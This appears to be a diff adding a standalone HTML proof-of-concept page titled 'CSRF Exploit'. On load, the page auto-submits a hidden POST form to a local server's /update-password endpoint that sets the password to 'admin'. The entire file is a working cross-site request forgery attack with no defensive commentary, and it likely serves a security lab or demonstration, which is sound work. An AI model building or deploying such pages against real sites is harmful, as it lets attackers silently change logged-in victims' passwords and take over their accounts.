@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Exploit</title>
+    <script>
+        function submitForm() {
+            document.getElementById("csrfForm").submit();
+        }
+    </script>
+</head>
+<body onload="submitForm()">
+    <h1>CSRF Exploit: Update Password via POST</h1>
+    <form id="csrfForm" action="http://127.0.0.1:5000/update-password" method="POST">
+        <input type="hidden" name="new_password" value="admin">
+        <input type="submit" value="Update Password">
+    </form>
+</body>
+</html>
